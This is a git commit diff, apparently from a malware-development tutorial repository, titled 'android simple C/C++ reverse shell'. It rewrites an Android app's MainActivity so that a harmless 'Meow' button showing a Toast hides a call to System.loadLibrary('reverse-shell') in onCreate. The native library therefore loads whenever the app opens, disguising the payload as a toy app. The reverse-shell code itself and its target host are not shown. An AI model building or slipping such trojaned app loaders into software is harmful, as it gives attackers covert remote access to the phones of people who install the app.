8690354afd7e569bfa5532f246434c3b3983d222
cocomelonc <cocomelonkz@gmail.com>
2025-05-02 18:42:27 +0300

    android simple C/C++ reverse shell

--- 09-linux-android/04-android-revsh/HackRev/app/src/main/java/com/example/hackrev/MainActivity.kt
+++ 09-linux-android/04-android-revsh/HackRev/app/src/main/java/com/example/hackrev/MainActivity.kt
@@ -2,47 +2,23 @@ package com.example.hackrev
 
 import android.os.Bundle
 import androidx.activity.ComponentActivity
-import androidx.activity.compose.setContent
-import androidx.activity.enableEdgeToEdge
-import androidx.compose.foundation.layout.fillMaxSize
-import androidx.compose.foundation.layout.padding
-import androidx.compose.material3.Scaffold
-import androidx.compose.material3.Text
-import androidx.compose.runtime.Composable
-import androidx.compose.ui.Modifier
-import androidx.compose.ui.tooling.preview.Preview
-import com.example.hackrev.ui.theme.HackRevTheme
+import android.widget.Button
+import android.widget.Toast
+
 
 class MainActivity : ComponentActivity() {
+    private lateinit var meowButton: Button
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        enableEdgeToEdge()
-        setContent {
-            HackRevTheme {
-                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
-                    Greeting(
-                        name = "Android",
-                        modifier = Modifier.padding(innerPadding)
-                    )
-                }
-            }
+        setContentView(R.layout.activity_main)
+        meowButton = findViewById(R.id.meowButton)
+        meowButton.setOnClickListener {
+            Toast.makeText(
+                applicationContext,
+                "Meow! ♥\uFE0F I Love Bahrain \uD83C\uDDE7\uD83C\uDDED",
+                Toast.LENGTH_SHORT
+            ).show()
         }
         System.loadLibrary("reverse-shell")
-    }
-}
-
-@Composable
-fun Greeting(name: String, modifier: Modifier = Modifier) {
-    Text(
-        text = "Meow-meow!!!! Hello $name!",
-        modifier = modifier
-    )
-}
-
-@Preview(showBackground = true)
-@Composable
-fun GreetingPreview() {
-    HackRevTheme {
-        Greeting("Bahrain")
     }
 }
